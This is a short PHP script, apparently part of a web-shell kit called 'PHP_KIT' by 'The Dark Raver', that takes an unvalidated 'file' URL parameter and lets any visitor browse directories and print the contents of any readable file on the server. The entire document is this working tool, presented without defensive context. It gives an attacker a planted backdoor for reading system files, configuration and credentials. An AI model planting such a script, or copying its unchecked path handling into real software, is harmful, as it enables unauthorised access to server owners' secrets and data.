<?
//
// PHP_KIT
//
// list.php = Directory & File Listing
//
// by: The Dark Raver
// modified: 21/01/2004
//
?>

<?

if($_GET['file']) {
	$fichero=$_GET['file']; 
	} else {
	$fichero="/";
	} 

if($handle = @opendir($fichero)) {
  while($filename = readdir($handle)) {
    echo "( ) <a href=?file=" . $fichero . "/" . $filename . ">" . $filename . "</a><br>";
    }
  closedir($handle);
  } else {
  echo "FILE: " . $fichero . "<br><hr><pre>";
  $fp = fopen($fichero, "r");
  $buffer = fread($fp, filesize($fichero));
  echo $buffer;
  fclose($fp);
  }

?>